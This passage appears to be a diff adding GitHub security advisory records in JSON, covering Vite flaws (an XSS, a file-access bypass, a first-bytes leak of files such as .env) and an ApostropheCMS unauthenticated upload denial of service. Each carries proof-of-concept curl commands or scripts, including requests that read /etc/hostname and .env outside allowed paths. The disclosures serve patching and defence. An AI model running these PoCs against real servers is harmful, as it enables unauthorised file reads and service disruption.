createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) => {\n  vite.middlewares(request, response, async (error) => {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () => document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy&index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-9jrq-w75r-8gcw",
+    "source_code_location": "https://github.com/vitejs/vite",
+    "identifiers": [
+      {
+        "value": "GHSA-9jrq-w75r-8gcw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112945",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112945",
+      "https://github.com/vitejs/vite/pull/23653",
+      "https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17",
+      "https://github.com/advisories/GHSA-9jrq-w75r-8gcw"
+    ],
+    "published_at": "2026-10-21T16:48:14Z",
+    "updated_at": "2026-10-21T16:48:15Z",
+    "github_reviewed_at": "2026-10-21T16:48:14Z",
+    "nvd_published_at": "2026-10-20T16:17:05Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.3.0, <= 8.3.2",
+        "first_patched_version": "8.3.3",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.2.0, <= 8.2.3",
+        "first_patched_version": "8.2.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.0.0, <= 8.1.5",
+        "first_patched_version": "8.1.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 7.0.0, <= 7.3.6",
+        "first_patched_version": "7.3.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": "<= 6.4.3",
+        "first_patched_version": "6.4.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite-plus"
+        },
+        "vulnerable_version_range": "<= 1.0.0",
+        "first_patched_version": "1.1.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+        "score": 2.1
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-80",
+        "name": "Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "deevashwer",
+          "id": 23222086,
+          "node_id": "MDQ6VXNlcjIzMjIyMDg2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/23222086?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/deevashwer",
+          "html_url": "https://github.com/deevashwer",
+          "followers_url": "https://api.github.com/users/deevashwer/followers",
+          "following_url": "https://api.github.com/users/deevashwer/following{/other_user}",
+          "gists_url": "https://api.github.com/users/deevashwer/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/deevashwer/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/deevashwer/subscriptions",
+          "organizations_url": "https://api.github.com/users/deevashwer/orgs",
+          "repos_url": "https://api.github.com/users/deevashwer/repos",
+          "events_url": "https://api.github.com/users/deevashwer/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/deevashwer/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "bluwy",
+          "id": 34116392,
+          "node_id": "MDQ6VXNlcjM0MTE2Mzky",
+          "avatar_url": "https://avatars.githubusercontent.com/u/34116392?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/bluwy",
+          "html_url": "https://github.com/bluwy",
+          "followers_url": "https://api.github.com/users/bluwy/followers",
+          "following_url": "https://api.github.com/users/bluwy/following{/other_user}",
+          "gists_url": "https://api.github.com/users/bluwy/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/bluwy/subscriptions",
+          "organizations_url": "https://api.github.com/users/bluwy/orgs",
+          "repos_url": "https://api.github.com/users/bluwy/repos",
+          "events_url": "https://api.github.com/users/bluwy/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/bluwy/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_reviewer"
+      }
+    ],
+    "comments": 4,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rq7h-c2jc-7f22",
+    "cve_id": "CVE-2026-112946",
+    "url": "https://api.github.com/advisories/GHSA-rq7h-c2jc-7f22",
+    "html_url": "https://github.com/advisories/GHSA-rq7h-c2jc-7f22",
+    "summary": "Vite: Files outside `server.fs.allow` could be served when project paths match system paths on non-Windows machine",
+    "description": "### Summary\n\nThe content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.\n\nThe content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.\n\n### Impact\n\nOnly apps that meet all of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))\n- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host\n- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n- the dev server is not running on Windows\n\n### Details\n\nWhen Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.\n\nFor a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.\n\n### PoC\nThe following example requires Linux with a readable `/etc/hostname`:\n```bash\n$ mkdir vite-safe-module-path-poc\n$ cd vite-safe-module-path-poc\n$ npm init -y\n$ npm install vite@8.3.1\n$ mkdir -p etc\n$ echo 'PROJECT-DECOY\\n' > etc/hostname\n$ echo 'import \"./etc/hostname\"\\n' > main.js\n$ npx vite --host 127.0.0.1\n```\n\nIn another terminal:\n```bash\n$ curl -o /dev/null -s -w '%{http_code}\\n' http://127.0.0.1:5173/main.js\n200\n$ curl -sS -o response -w '%{http_code}\\n' http://127.0.0.1:5173/@fs/etc/hostname\n200\n$ cmp -s response /etc/hostname && echo 'response matches host file'\nresponse matches host file\n```",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-rq7h-c2jc-7f22",
+    "source_code_location": "https://github.com/vitejs/vite",
+    "identifiers": [
+      {
+        "value": "GHSA-rq7h-c2jc-7f22",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112946",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112946",
+      "https://github.com/vitejs/vite/pull/23656",
+      "https://github.com/vitejs/vite/commit/170b92791421bcd484f7325936d989a82d6bd4aa",
+      "https://github.com/vitejs/vite/commit/45c0e3392a298626955a0ab93a8e51232daac721",
+      "https://github.com/vitejs/vite/commit/c3e06f92e969952466b4e2f5801e85e1e00cd905",
+      "https://github.com/vitejs/vite/commit/e570d8d016096b5f8f6f09808376ca6cf73f27d0",
+      "https://github.com/vitejs/vite/commit/f0d76c7da13d5e794807b82f0b86c1931a8438e3",
+      "https://github.com/advisories/GHSA-rq7h-c2jc-7f22"
+    ],
+    "published_at": "2026-10-21T16:47:42Z",
+    "updated_at": "2026-10-21T16:47:43Z",
+    "github_reviewed_at": "2026-10-21T16:47:42Z",
+    "nvd_published_at": "2026-10-20T16:17:05Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.3.0, <= 8.3.2",
+        "first_patched_version": "8.3.3",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.2.0, <= 8.2.3",
+        "first_patched_version": "8.2.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.0.0, <= 8.1.5",
+        "first_patched_version": "8.1.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 7.0.0, <= 7.3.6",
+        "first_patched_version": "7.3.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": "<= 6.4.3",
+        "first_patched_version": "6.4.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite-plus"
+        },
+        "vulnerable_version_range": "<= 1.0.0",
+        "first_patched_version": "1.1.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "score": 6.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
+      {
+        "cwe_id": "CWE-284",
+        "name": "Improper Access Control"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Kushalkhemka",
+          "id": 72255307,
+          "node_id": "MDQ6VXNlcjcyMjU1MzA3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/72255307?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Kushalkhemka",
+          "html_url": "https://github.com/Kushalkhemka",
+          "followers_url": "https://api.github.com/users/Kushalkhemka/followers",
+          "following_url": "https://api.github.com/users/Kushalkhemka/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Kushalkhemka/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Kushalkhemka/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Kushalkhemka/subscriptions",
+          "organizations_url": "https://api.github.com/users/Kushalkhemka/orgs",
+          "repos_url": "https://api.github.com/users/Kushalkhemka/repos",
+          "events_url": "https://api.github.com/users/Kushalkhemka/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Kushalkhemka/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      },
+      {
+        "user": {
+          "login": "bluwy",
+          "id": 34116392,
+          "node_id": "MDQ6VXNlcjM0MTE2Mzky",
+          "avatar_url": "https://avatars.githubusercontent.com/u/34116392?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/bluwy",
+          "html_url": "https://github.com/bluwy",
+          "followers_url": "https://api.github.com/users/bluwy/followers",
+          "following_url": "https://api.github.com/users/bluwy/following{/other_user}",
+          "gists_url": "https://api.github.com/users/bluwy/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/bluwy/subscriptions",
+          "organizations_url": "https://api.github.com/users/bluwy/orgs",
+          "repos_url": "https://api.github.com/users/bluwy/repos",
+          "events_url": "https://api.github.com/users/bluwy/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/bluwy/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_reviewer"
+      },
+      {
+        "user": {
+          "login": "mayank-jangid-moon",
+          "id": 175295782,
+          "node_id": "U_kgDOCnLNJg",
+          "avatar_url": "https://avatars.githubusercontent.com/u/175295782?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mayank-jangid-moon",
+          "html_url": "https://github.com/mayank-jangid-moon",
+          "followers_url": "https://api.github.com/users/mayank-jangid-moon/followers",
+          "following_url": "https://api.github.com/users/mayank-jangid-moon/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mayank-jangid-moon/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mayank-jangid-moon/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mayank-jangid-moon/subscriptions",
+          "organizations_url": "https://api.github.com/users/mayank-jangid-moon/orgs",
+          "repos_url": "https://api.github.com/users/mayank-jangid-moon/repos",
+          "events_url": "https://api.github.com/users/mayank-jangid-moon/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mayank-jangid-moon/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      },
+      {
+        "user": {
+          "login": "skigeek16",
+          "id": 177405396,
+          "node_id": "U_kgDOCpL91A",
+          "avatar_url": "https://avatars.githubusercontent.com/u/177405396?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/skigeek16",
+          "html_url": "https://github.com/skigeek16",
+          "followers_url": "https://api.github.com/users/skigeek16/followers",
+          "following_url": "https://api.github.com/users/skigeek16/following{/other_user}",
+          "gists_url": "https://api.github.com/users/skigeek16/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/skigeek16/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/skigeek16/subscriptions",
+          "organizations_url": "https://api.github.com/users/skigeek16/orgs",
+          "repos_url": "https://api.github.com/users/skigeek16/repos",
+          "events_url": "https://api.github.com/users/skigeek16/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/skigeek16/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      },
+      {
+        "user": {
+          "login": "opensec-intelligence",
+          "id": 323596076,
+          "node_id": "U_kgDOE0mvLA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/323596076?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/opensec-intelligence",
+          "html_url": "https://github.com/opensec-intelligence",
+          "followers_url": "https://api.github.com/users/opensec-intelligence/followers",
+          "following_url": "https://api.github.com/users/opensec-intelligence/following{/other_user}",
+          "gists_url": "https://api.github.com/users/opensec-intelligence/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/opensec-intelligence/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/opensec-intelligence/subscriptions",
+          "organizations_url": "https://api.github.com/users/opensec-intelligence/orgs",
+          "repos_url": "https://api.github.com/users/opensec-intelligence/repos",
+          "events_url": "https://api.github.com/users/opensec-intelligence/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/opensec-intelligence/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "tool"
+      }
+    ],
+    "comments": 4,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vfpm-58rq-9qcg",
+    "cve_id": "CVE-2026-112947",
+    "url": "https://api.github.com/advisories/GHSA-vfpm-58rq-9qcg",
+    "html_url": "https://github.com/advisories/GHSA-vfpm-58rq-9qcg",
+    "summary": "Vite: First 4 bytes of files outside of `server.fs` setting is exposed by `?vite-wasm-instance`",
+    "description": "### Summary\n\nThe first 4 bytes of files outside of `server.fs` setting can be returned to the browser by a request containing `?vite-wasm-instance`.\n\n### Impact\n\n Only apps that match one of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network using `--host` or the [`server.host`](https://vite.dev/config/server-options#server-host) option\n- there's a file that has a sensitive information in **the first 4 bytes**\n- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)\n\n### Details\nRequests containing the `?vite-wasm-instance` query are handled by the internal Wasm plugin's `load` hook. The hook removes the query and reads the resulting path directly from disk, but the `server.fs` checks were not applied.\n\nAfter reading the file, Vite attempts to parse it as WebAssembly. When that parse fails, Node and deno throws an error that contains the first 4 bytes of the file.\n\n### PoC\n\nCreate a denied file and start an affected Vite dev server:\n\n```bash\necho 'SECRET_KEY=abc123\\n' > .env\nnpm run dev\ncurl 'http://localhost:5173/.env?vite-wasm-instance'\n```\n\nThis will show\n```\nFailed to parse WASM file \"<root>/.env\": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0\n```",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-vfpm-58rq-9qcg",
+    "source_code_location": "https://github.com/vitejs/vite",
+    "identifiers": [
+      {
+        "value": "GHSA-vfpm-58rq-9qcg",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112947",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/vitejs/vite/security/advisories/GHSA-vfpm-58rq-9qcg",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112947",
+      "https://github.com/vitejs/vite/pull/23655",
+      "https://github.com/vitejs/vite/commit/b6c6d2fb3f853aab4092dc25f0d6816a96c23dff",
+      "https://github.com/vitejs/vite/commit/ba8b7ab43b4afa5d0292ab4b6e3a7b5033cc9c73",
+      "https://github.com/advisories/GHSA-vfpm-58rq-9qcg"
+    ],
+    "published_at": "2026-10-21T16:47:15Z",
+    "updated_at": "2026-10-21T16:47:16Z",
+    "github_reviewed_at": "2026-10-21T16:47:15Z",
+    "nvd_published_at": "2026-10-20T16:17:05Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.3.0, <= 8.3.2",
+        "first_patched_version": "8.3.3",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite"
+        },
+        "vulnerable_version_range": ">= 8.2.0, <= 8.2.3",
+        "first_patched_version": "8.2.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "vite-plus"
+        },
+        "vulnerable_version_range": ">= 0.2.8, <= 1.0.0",
+        "first_patched_version": "1.1.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "score": 6.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
+      {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      },
+      {
+        "cwe_id": "CWE-209",
+        "name": "Generation of Error Message Containing Sensitive Information"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "zer0d4y5",
+          "id": 80118415,
+          "node_id": "MDQ6VXNlcjgwMTE4NDE1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/80118415?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/zer0d4y5",
+          "html_url": "https://github.com/zer0d4y5",
+          "followers_url": "https://api.github.com/users/zer0d4y5/followers",
+          "following_url": "https://api.github.com/users/zer0d4y5/following{/other_user}",
+          "gists_url": "https://api.github.com/users/zer0d4y5/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/zer0d4y5/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/zer0d4y5/subscriptions",
+          "organizations_url": "https://api.github.com/users/zer0d4y5/orgs",
+          "repos_url": "https://api.github.com/users/zer0d4y5/repos",
+          "events_url": "https://api.github.com/users/zer0d4y5/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/zer0d4y5/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "bluwy",
+          "id": 34116392,
+          "node_id": "MDQ6VXNlcjM0MTE2Mzky",
+          "avatar_url": "https://avatars.githubusercontent.com/u/34116392?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/bluwy",
+          "html_url": "https://github.com/bluwy",
+          "followers_url": "https://api.github.com/users/bluwy/followers",
+          "following_url": "https://api.github.com/users/bluwy/following{/other_user}",
+          "gists_url": "https://api.github.com/users/bluwy/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/bluwy/subscriptions",
+          "organizations_url": "https://api.github.com/users/bluwy/orgs",
+          "repos_url": "https://api.github.com/users/bluwy/repos",
+          "events_url": "https://api.github.com/users/bluwy/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/bluwy/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_reviewer"
+      }
+    ],
+    "comments": 3,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-86wm-68pq-5jwq",
+    "cve_id": "CVE-2026-113711",
+    "url": "https://api.github.com/advisories/GHSA-86wm-68pq-5jwq",
+    "html_url": "https://github.com/advisories/GHSA-86wm-68pq-5jwq",
+    "summary": "ApostropheCMS: Unauthenticated resource exhaustion via pre-auth aposBigUpload processing in @apostrophecms/import-export",
+    "description": "## Summary\n\nA potential unauthenticated denial-of-service vulnerability exists in the chunked import upload path used by `@apostrophecms/import-export`.\n\nThe affected import API routes invoke:\n\n`self.apos.http.bigUploadMiddleware()`\n\nbefore the actual import handler performs its authentication check.\n\nBecause no `authorize` callback is supplied to `bigUploadMiddleware()`, unauthenticated requests can reach the `aposBigUpload` `start`, `chunk`, and `end` operations before the later `req.user` check rejects the import.\n\nAs a result, an unauthenticated remote attacker can create server-side upload state, write chunk data to upload storage, trigger temporary-file processing, and cause attacker-controlled cleanup operations before authentication is enforced.\n\n## Affected Component\n\nPackage:\n\n`@apostrophecms/import-export`\n\nConfirmed affected version:\n\n`3.6.2`\n\nPotential earlier affected versions:\n\nThe issue may affect earlier 3.x releases in which the current big-upload-based import implementation is present. I have not yet fully verified the exact introduction version and recommend that the maintainers confirm the affected version range.\n\n## Vulnerability Type\n\nPrimary:\n\n**CWE-400 — Uncontrolled Resource Consumption**\n\nRelated:\n\n**CWE-306 — Missing Authentication for Critical Function**\n\n**CWE-770 — Allocation of Resources Without Limits or Throttling**\n\n## Technical Details\n\nThe page import route registers the following middleware chain:\n\n`packages/import-export/modules/@apostrophecms/import-export-page/index.js`\n\n```javascript\nimportExportImport: [\n  self.apos.http.bigUploadMiddleware(),\n  async (req) => {\n    return self.apos.modules['@apostrophecms/import-export']\n      .import(req, self.__meta.name);\n  }\n]\n```\n\nNo `authorize` callback is passed to `bigUploadMiddleware()`.\n\nThe `bigUploadMiddleware()` implementation explicitly supports an `authorize` callback and performs that authorization before processing the `aposBigUpload` protocol when supplied.\n\nWithout that callback, requests containing:\n\n`aposBigUpload[type]=start`\n\n`aposBigUpload[type]=chunk`\n\nor\n\n`aposBigUpload[type]=end`\n\nare processed immediately.\n\nThe actual authentication check occurs later in:\n\n`packages/import-export/lib/methods/import.js`\n\n```javascript\nasync import(req, moduleName) {\n  if (!req.user) {\n    throw self.apos.error('forbidden');\n  }\n```\n\nThis means authentication occurs only after the chunked-upload middleware has already performed server-side work.\n\n## Attack Flow\n\n### 1. Start\n\nAn unauthenticated attacker submits an `aposBigUpload[type]=start` request.\n\nThe server generates an upload ID and stores attacker-supplied upload metadata, including the declared `chunks` count.\n\n### 2. Chunk\n\nThe attacker can upload chunk data.\n\n`bigUploadChunk()` copies attacker-controlled data into:\n\n`/big-uploads/<id>-<n>-<chunk>`\n\n### 3. End\n\nThe attacker sends an `aposBigUpload[type]=end` request.\n\n`bigUploadEnd()` begins processing the upload and creates temporary files before invoking the downstream import handler.\n\nOnly after this processing completes does execution reach the later authentication check in `import()`.\n\n### 4. Cleanup amplification\n\nThe attacker-controlled `chunks` value is also used by `bigUploadCleanupOne()`:\n\n```javascript\nfor (const { chunks } of Object.values(bigUpload.files)) {\n  for (let i = 0; (i < chunks); i++) {\n    await ufs.remove(...);\n  }\n}\n```\n\nNo small upper bound on the declared chunk count appears to be enforced at upload initialization.\n\nThis allows an unauthenticated attacker to increase the number of filesystem cleanup operations performed for an upload.\n\n## Proof of Concept\n\nThe following reproduction was performed only against an isolated test environment.\n\n### Start an upload without authentication\n\n```bash\ncurl -s -X POST \\\n  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=start' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"files\":{\"file\":{\"name\":\"evil.tar.gz\",\"size\":4,\"type\":\"application/gzip\",\"chunks\":1}}}'\n```\n\nThe server returns an upload ID despite the request having no authenticated session.\n\n### Upload a chunk\n\n```bash\nprintf 'PWN!' >/tmp/chunk.bin\n\ncurl -s -X POST \\\n  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=chunk&aposBigUpload[id]=<ID>&aposBigUpload[n]=0&aposBigUpload[chunk]=0' \\\n  -F 'chunk=@/tmp/chunk.bin;type=application/octet-stream'\n```\n\nThe request succeeds and causes server-side upload storage to be used.\n\n### Finalize the upload\n\n```bash\ncurl -i -X POST \\\n  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=end&aposBigUpload[id]=<ID>'\n```\n\nObserved behavior:\n\n* `start` returns HTTP 200 and an upload ID without authentication.\n* `chunk` returns HTTP 200 and results in server-side chunk storage.\n* `end` eventually reaches the downstream authentication check and is rejected.\n* However, the server-side big-upload processing has already occurred before that authentication rejection.\n\nIn my isolated harness:\n\n* `chunks=1` resulted in one cleanup removal attempt.\n* `chunks=50` resulted in 50 cleanup removal attempts.\n\nThis demonstrates that the attacker-controlled chunk count directly influences server-side cleanup work.\n\n## Security Impact\n\nThe vulnerability allows an unauthenticated remote attacker to cause server-side storage and filesystem operations that should only be reachable by authorized import users.\n\nPossible consequences include:\n\n* Consumption of upload and temporary storage.\n* Creation of server-side upload state by unauthenticated users.\n* Repeated filesystem I/O.\n* Cleanup amplification based on attacker-controlled chunk counts.\n* Potential service degradation or denial of service when the attack is repeated or sufficiently amplified.\n\n## Root Cause\n\nAuthentication is enforced in the downstream import handler rather than before the chunked-upload middleware.\n\nThe middleware itself already supports an `authorize` callback specifically for preventing unauthorized use of the big-upload functionality.\n\n## Suggested Remediation\n\nRequire authentication before any `aposBigUpload` operation is processed.\n\nFor example:\n\n* Pass an appropriate `authorize` callback to `bigUploadMiddleware()` on all import routes.\n* Reject unauthenticated users before `start`, `chunk`, or `end`.\n* Enforce reasonable limits on declared chunk counts.\n* Validate declared size against actual uploaded data.\n* Introduce per-user and global storage/rate limits.\n* Ensure temporary files are removed when downstream processing fails.\n* Add regression tests confirming that anonymous `start`, `chunk`, and `end` requests are rejected before upload state or files are created.\n\nRelevant reviewed commit:\n\n`d3ff8c9bb001be1acf7fdc3f035190250ac64b45`\n\n## Researcher Credit\n\n**Kai Zhi**\n\nGitHub:\n\n**https://github.com/kaizhi888**",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-86wm-68pq-5jwq",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-86wm-68pq-5jwq",
+        "type": "GHSA"
+      },
